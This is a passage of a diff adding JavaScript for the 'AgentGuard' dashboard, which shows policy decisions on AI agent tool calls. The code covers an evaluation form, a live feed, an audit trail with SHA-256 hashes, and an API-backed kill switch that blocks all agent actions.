+    .replace(/"/g, '&quot;')
+    .replace(/'/g, '&#39;');
+}
+
+// ── Mobile Nav ───────────────────────────────────────────
+function openMobileNav() {
+  document.getElementById('mobile-nav-overlay').classList.add('open');
+  document.getElementById('mobile-nav-drawer').classList.add('open');
+}
+function closeMobileNav() {
+  document.getElementById('mobile-nav-overlay').classList.remove('open');
+  document.getElementById('mobile-nav-drawer').classList.remove('open');
+}
+
+// ── Init ─────────────────────────────────────────────────
+async function init() {
+  // Load stored API key
+  loadApiKey();
+  
+  // Show cold-start warning immediately
+  document.getElementById('cold-start-banner').classList.add('visible');
+
+  // Try primary API URL first, fall back to Azure direct
+  let apiOnline = false;
+  for (const url of [API_PRIMARY, API_FALLBACK]) {
+    try {
+      const r = await fetch(`${url}/health`, { signal: AbortSignal.timeout(8000) });
+      if (r.ok) {
+        API = url;
+        const d = await r.json();
+        apiOnline = true;
+        document.getElementById('api-dot').style.background = 'var(--green)';
+        document.getElementById('api-status').innerHTML =
+          `<span style="width:8px;height:8px;border-radius:50%;background:var(--green);display:inline-block"></span> API Online (${Math.round(d.uptime)}s uptime)`;
+
+        // Sync kill switch state from API
+        if (d.killSwitch === true) {
+          killActive = true;
+          updateKillSwitchUI();
+        }
+        break;
+      }
+    } catch {}
+  }
+
+  if (!apiOnline) {
+    document.getElementById('api-dot').style.background = 'var(--red)';
+    document.getElementById('api-status').innerHTML =
+      `<span style="width:8px;height:8px;border-radius:50%;background:var(--red);display:inline-block"></span> API warming up — try again in 15s`;
+  } else {
+    document.getElementById('cold-start-banner').classList.remove('visible');
+  }
+
+  // Load real usage stats if API key is available
+  if (storedApiKey) {
+    await loadUsageStats();
+    await loadAuditTrail();
+  }
+
+  // Create session
+  try {
+    const r = await fetch(`${API}/api/v1/playground/session`, { method: 'POST', headers: { 'Content-Type': 'application/json' } });
+    const d = await r.json();
+    sessionId = d.sessionId;
+    renderPolicy(d.policy);
+  } catch {}
+
+  // Load full policy
+  try {
+    const r = await fetch(`${API}/api/v1/playground/policy`);
+    const d = await r.json();
+    document.getElementById('policy-json').textContent = JSON.stringify(d.policy, null, 2);
+    renderPolicyRules(d.policy.rules);
+  } catch {
+    document.getElementById('policy-rules').innerHTML =
+      '<div style="padding:24px;text-align:center;color:var(--text-dim)">Could not load policy. <button class="btn btn-ghost" onclick="init()" style="margin-left:8px">Retry</button></div>';
+  }
+
+  // Fetch live kill switch state
+  try {
+    const r = await fetch(`${API}/api/v1/killswitch`);
+    const d = await r.json();
+    killActive = d.active;
+    updateKillSwitchUI();
+    document.getElementById('kill-api-status').textContent = d.message || '';
+  } catch {}
+}
+
+function renderPolicy(p) {
+  const rulesHtml = p.rules.map(r => `
+    <div style="padding:6px 0;border-top:1px solid var(--border-dim);display:flex;align-items:center;gap:8px">
+      <span class="badge badge-${esc(r.action)}">${esc(r.action)}</span>
+      <span style="color:var(--text-bright);font-weight:600">${esc(r.id)}</span>
+    </div>`).join('');
+
+  document.getElementById('overview-policy').innerHTML = `
+    <div style="font-family:var(--mono);font-size:0.85rem">
+      <div style="margin-bottom:8px"><span style="color:var(--text-dim)">ID:</span> <span style="color:var(--text-bright)">${esc(p.id)}</span></div>
+      <div style="margin-bottom:8px"><span style="color:var(--text-dim)">Rules:</span> <span style="color:var(--accent-hi)">${esc(String(p.ruleCount))}</span></div>
+      <div style="margin-bottom:12px"><span style="color:var(--text-dim)">Default:</span> <span class="badge badge-${esc(p.default)}">${esc(p.default)}</span></div>
+      ${rulesHtml}
+    </div>`;
+}
+
+function renderPolicyRules(rules) {
+  document.getElementById('policy-rules').innerHTML = rules.map(r => `
+    <div class="policy-rule">
+      <div class="rule-id">${esc(r.id)}</div>
+      <span class="badge badge-${esc(r.action)}">${esc(r.action)}</span>
+      <span class="badge badge-${esc(r.severity)}">${esc(r.severity)}</span>
+      <div class="rule-desc">${esc(r.description)}</div>
+    </div>`).join('');
+}
+
+// ── Navigation ──────────────────────────────────────────
+function showPage(id, evt) {
+  document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+  document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
+  document.getElementById('page-' + id).classList.add('active');
+  // Update title
+  const titles = { overview: 'Dashboard', live: 'Live Feed', evaluate: 'Evaluate', policy: 'Policies', audit: 'Audit Trail', killswitch: 'Kill Switch', sdk: 'SDK & API' };
+  document.title = `AgentGuard — ${titles[id] || id}`;
+  // Mark active nav item
+  if (evt && evt.target) {
+    evt.target.closest('.nav-item')?.classList.add('active');
+  } else {
+    // Fallback: find nav item by onclick content
+    document.querySelectorAll('.nav-item').forEach(n => {
+      if (n.getAttribute('onclick') && n.getAttribute('onclick').includes(`'${id}'`)) {
+        n.classList.add('active');
+      }
+    });
+  }
+  // Close mobile nav if open
+  closeMobileNav();
+  
+  // Reload data when switching to certain pages
+  if (id === 'overview' && storedApiKey) {
+    loadUsageStats();
+  }
+  if (id === 'audit' && storedApiKey) {
+    loadAuditTrail();
+  }
+}
+
+// ── Evaluate ────────────────────────────────────────────
+function loadPreset(tool, params) {
+  document.getElementById('eval-tool').value = tool;
+  document.getElementById('eval-params').value = JSON.stringify(params, null, 2);
+}
+
+async function doEvaluate() {
+  const tool = document.getElementById('eval-tool').value.trim();
+  const paramsStr = document.getElementById('eval-params').value.trim();
+  const resultEl = document.getElementById('eval-result');
+  const btn = document.getElementById('eval-btn');
+
+  if (!tool) {
+    resultEl.innerHTML = '<div style="color:var(--red)">Tool name is required</div>';
+    return;
+  }
+  let params = {};
+  try {
+    params = paramsStr ? JSON.parse(paramsStr) : {};
+  } catch {
+    resultEl.innerHTML = '<div style="color:var(--red)">Invalid JSON parameters</div>';
+    return;
+  }
+
+  // Kill switch: still call the real API (which will also block)
+  // But show immediate feedback
+  if (killActive) {
+    resultEl.innerHTML = `
+      <div style="text-align:center;padding:24px 0">
+        <div style="font-size:1.5rem;font-weight:700;color:var(--red);margin-bottom:8px">✕ BLOCKED</div>
+        <div style="font-family:var(--mono);font-size:0.85rem;color:var(--text-dim);margin-bottom:4px">rule: KILL_SWITCH</div>
+        <div style="color:var(--text-dim);font-size:0.85rem;margin-bottom:20px">Global kill switch is ACTIVE — all agent actions are blocked.</div>
+      </div>`;
+    evalCount++;
+    const event = {
+      time: new Date(), tool: esc(tool), params, result: 'block',
+      ruleId: 'KILL_SWITCH', riskScore: 1000,
+      reason: 'Kill switch active', durationMs: 0,
+      hash: 'killswitch'
+    };
+    allEvents.push(event);
+    updateStats();
+    addFeedItem(event);
+    addAuditRow(event);
+    return;
+  }
+
+  btn.disabled = true;
+  btn.textContent = '⏳ Evaluating...';
+  const t0 = performance.now();
+
+  try {
+    const r = await fetch(`${API}/api/v1/playground/evaluate`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ sessionId, tool, params })
+    });
+    const data = await r.json();
+    const roundTrip = Math.round(performance.now() - t0);
+    renderResult(data, tool, params, roundTrip);
+  } catch (e) {
+    resultEl.innerHTML =
+      `<div style="color:var(--red)">API Error: Connection failed</div>` +
+      `<div style="color:var(--text-dim);margin-top:8px">API may be cold-starting. Try again in 15s.</div>`;
+    document.getElementById('cold-start-banner').classList.add('visible');
+  } finally {
+    btn.disabled = false;
+    btn.textContent = '▶ Evaluate';
+  }
+}
+
+function updateStats() {
+  let allowed = 0, blocked = 0;
+  allEvents.forEach(e => {
+    if (e.result === 'allow') allowed++;
+    else if (e.result === 'block') blocked++;
+  });
+  document.getElementById('stat-total').textContent = allEvents.length;
+  document.getElementById('stat-allowed').textContent = allowed;
+  document.getElementById('stat-blocked').textContent = blocked;
+  document.getElementById('stat-allow-pct').textContent = allEvents.length ? `${Math.round(allowed / allEvents.length * 100)}%` : '—';
+  document.getElementById('stat-block-pct').textContent = allEvents.length ? `${Math.round(blocked / allEvents.length * 100)}%` : '—';
+}
+
+function renderResult(data, tool, params, roundTrip) {
+  const d = data.decision;
+  const colors = { allow: 'var(--green)', block: 'var(--red)', monitor: 'var(--accent-hi)', require_approval: 'var(--amber)' };
+  const icons = { allow: '✓ ALLOWED', block: '✕ BLOCKED', monitor: '◉ MONITORED', require_approval: '⏸ APPROVAL REQUIRED' };
+  const c = colors[d.result] || 'var(--text)';
+
+  evalCount++;
+  totalLatency += d.durationMs;
+  const avgLatency = (totalLatency / evalCount).toFixed(2);
+
+  // Use esc() for all API-derived text values (XSS prevention)
+  const safeResult = esc(d.result || '');
+  const safeRule = d.matchedRuleId ? esc(d.matchedRuleId) : '';
+  const safeReason = esc(d.reason || 'Default action applied');
+  const safeIcon = icons[d.result] || esc(d.result);
+
+  document.getElementById('eval-result').innerHTML = `
+    <div style="text-align:center;padding:24px 0">
+      <div style="font-size:1.5rem;font-weight:700;color:${c};margin-bottom:8px">${safeIcon}</div>
+      ${safeRule ? `<div style="font-family:var(--mono);font-size:0.85rem;color:var(--text-dim);margin-bottom:4px">rule: ${safeRule}</div>` : ''}
+      <div style="color:var(--text-dim);font-size:0.85rem;margin-bottom:20px">${safeReason}</div>
+    </div>
+    <div style="display:grid;grid-template-columns:repeat(3,1fr);gap:12px;margin-bottom:20px">
+      <div style="text-align:center;padding:12px;background:var(--bg-card2);border-radius:8px">
+        <div style="font-size:0.72rem;color:var(--text-dim);margin-bottom:4px">RISK SCORE</div>
+        <div style="font-family:var(--mono);font-size:1.2rem;font-weight:700;color:${d.riskScore > 50 ? 'var(--red)' : d.riskScore > 0 ? 'var(--amber)' : 'var(--green)'}">${d.riskScore}</div>
+      </div>
+      <div style="text-align:center;padding:12px;background:var(--bg-card2);border-radius:8px">
+        <div style="font-size:0.72rem;color:var(--text-dim);margin-bottom:4px">ENGINE LATENCY</div>
+        <div style="font-family:var(--mono);font-size:1.2rem;font-weight:700;color:var(--accent-hi)">${d.durationMs}ms</div>
+      </div>
+      <div style="text-align:center;padding:12px;background:var(--bg-card2);border-radius:8px">
+        <div style="font-size:0.72rem;color:var(--text-dim);margin-bottom:4px">ROUND TRIP</div>
+        <div style="font-family:var(--mono);font-size:1.2rem;font-weight:700;color:var(--text)">${roundTrip}ms</div>
+      </div>
+    </div>
+    <details style="margin-top:12px">
+      <summary style="color:var(--text-dim);font-size:0.82rem;cursor:pointer">Raw JSON</summary>
+      <pre style="font-family:var(--mono);font-size:0.78rem;color:var(--text-dim);margin-top:8px;overflow-x:auto"></pre>
+    </details>`;
+
+  // Safe JSON rendering via textContent (no innerHTML for JSON data)
+  const pre = document.getElementById('eval-result').querySelector('details pre');
+  if (pre) pre.textContent = JSON.stringify(d, null, 2);
+
+  document.getElementById('eval-latency').textContent = `${roundTrip}ms`;
+  document.getElementById('stat-latency').textContent = avgLatency + 'ms';
+
+  const event = {
+    time: new Date(),
+    tool: esc(tool),
+    params,
+    result: d.result,
+    ruleId: d.matchedRuleId ? esc(d.matchedRuleId) : null,
+    riskScore: d.riskScore,
+    reason: esc(d.reason || ''),
+    durationMs: d.durationMs,
+    hash: null // will be computed async
+  };
+  allEvents.push(event);
+  updateStats();
+  addFeedItem(event);
+  addAuditRow(event);
+
+  // Compute real hash via Web Crypto API
+  computeAuditHash(event);
+}
+
+// Compute SHA-256 hash of audit event using Web Crypto API
+async function computeAuditHash(event) {
+  try {
+    const data = `${event.tool}|${event.result}|${event.time.toISOString()}`;
+    const encoded = new TextEncoder().encode(data);
+    const hashBuf = await crypto.subtle.digest('SHA-256', encoded);
+    const hashHex = Array.from(new Uint8Array(hashBuf)).map(b => b.toString(16).padStart(2, '0')).join('');
+    event.hash = hashHex.slice(0, 16);
+    // Update audit row hash cell
+    const rows = document.getElementById('audit-tbody').querySelectorAll('tr');
+    // The most recently added row is at the top (afterbegin insertion)
+    if (rows.length > 0) {
+      const hashCell = rows[0].cells[7];
+      if (hashCell) hashCell.textContent = event.hash + '...';
+    }
+  } catch {}
+}
+
+function addFeedItem(event) {
+  const colors = { allow: 'var(--green)', block: 'var(--red)', monitor: 'var(--accent-hi)', require_approval: 'var(--amber)' };
+  const c = colors[event.result] || 'var(--text-dim)';
+  const time = event.time.toLocaleTimeString();
+
+  ['recent-feed', 'live-feed'].forEach(id => {
+    const el = document.getElementById(id);
+    if (el.querySelector('[style*="text-align:center"]')) el.innerHTML = '';
+
+    const div = document.createElement('div');
+    div.className = 'feed-item feed-new';
+
+    const dot = document.createElement('div');
+    dot.className = 'feed-dot';
+    dot.style.background = c;
+
+    const timeEl = document.createElement('div');
+    timeEl.className = 'feed-time';
+    timeEl.textContent = time;
+
+    const content = document.createElement('div');
+    content.className = 'feed-content';
+
+    const toolEl = document.createElement('div');
+    toolEl.className = 'feed-tool';
+    toolEl.textContent = event.tool + ' → ';
+    const resultSpan = document.createElement('span');
+    resultSpan.style.cssText = `color:${c};font-weight:600`;
+    resultSpan.textContent = event.result.toUpperCase();
+    toolEl.appendChild(resultSpan);
+
+    const ruleEl = document.createElement('div');
+    ruleEl.className = 'feed-rule';
+    ruleEl.textContent = `${event.ruleId || 'default'} · risk ${event.riskScore} · ${event.durationMs}ms`;
+
+    content.appendChild(toolEl);
+    content.appendChild(ruleEl);
+    div.appendChild(dot);
+    div.appendChild(timeEl);
+    div.appendChild(content);
+    el.insertBefore(div, el.firstChild);
+  });
+}
+
+function addAuditRow(event) {
+  const tbody = document.getElementById('audit-tbody');
+  if (tbody.querySelector('[colspan]')) tbody.innerHTML = '';
+  const colors = { allow: 'badge-allow', block: 'badge-block', monitor: 'badge-monitor', require_approval: 'badge-require_approval' };
+  const idx = allEvents.length;
+
+  const tr = document.createElement('tr');
+
+  function td(text, extraStyle) {
+    const el = document.createElement('td');
+    el.style.cssText = 'font-family:var(--mono);font-size:0.82rem' + (extraStyle ? ';' + extraStyle : '');
+    el.textContent = String(text);
+    return el;
+  }
+
+  tr.appendChild(td(idx));
+  tr.appendChild(td(event.time.toLocaleTimeString(), 'color:var(--text-dim)'));
+  tr.appendChild(td(event.tool));
+
+  // Decision badge
+  const badgeTd = document.createElement('td');
+  const badge = document.createElement('span');
+  badge.className = `badge ${colors[event.result] || ''}`;
+  badge.textContent = event.result;
+  badgeTd.appendChild(badge);
+  tr.appendChild(badgeTd);
+
+  tr.appendChild(td(event.ruleId || '—', 'color:var(--text-dim)'));
+  tr.appendChild(td(event.riskScore, `color:${event.riskScore > 50 ? 'var(--red)' : 'var(--green)'}`));
+  tr.appendChild(td(event.durationMs + 'ms', 'color:var(--accent-hi)'));
+  tr.appendChild(td(event.hash ? event.hash + '...' : 'computing...', 'font-size:0.75rem;color:var(--text-dim)'));
+
+  tbody.insertBefore(tr, tbody.firstChild);
+  document.getElementById('audit-count').textContent = allEvents.length;
+}
+
+function clearFeed() {
+  document.getElementById('live-feed').innerHTML = '<div style="padding:24px;text-align:center;color:var(--text-dim)">Feed cleared</div>';
+}
+
+// ── Kill Switch — calls real API ────────────────────────
+async function toggleKillSwitch() {
+  const btn = document.getElementById('kill-btn');
+  const statusEl = document.getElementById('kill-api-status');
+  btn.disabled = true;
+  btn.style.opacity = '0.6';
+  statusEl.textContent = 'Contacting API...';
+
+  const newState = !killActive;
+  try {
+    const r = await fetch(`${API}/api/v1/killswitch`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ active: newState })
+    });
+    if (!r.ok) throw new Error(`HTTP ${r.status}`);
+    const d = await r.json();
+    killActive = d.active;
+    statusEl.textContent = d.message || '';
+  } catch (e) {
+    // If API is unavailable, still toggle local state with clear warning
+    killActive = newState;
+    statusEl.textContent = '⚠️ API unreachable — local state only. Reload to sync.';
+  } finally {
+    btn.disabled = false;
+    btn.style.opacity = '1';
+    updateKillSwitchUI();
+  }
+}
+
+function updateKillSwitchUI() {
+  const btn = document.getElementById('kill-btn');
+  const status = document.getElementById('kill-status');
+  if (!btn || !status) return;
+  if (killActive) {
+    btn.classList.add('active');
+    btn.innerHTML = '⚠️ ACTIVE<br><span style="font-size:0.8rem">Click to deactivate</span>';
+    status.innerHTML = 'Status: <span style="color:var(--red);font-weight:700">ACTIVE — All agents blocked</span>';
+  } else {
+    btn.classList.remove('active');
+    btn.innerHTML = 'KILL<br>SWITCH';
+    status.innerHTML = 'Status: <span style="color:var(--green)">Inactive</span>';
+  }
+}
+
+// Boot
+init();
+</script>
+</body>
+</html>
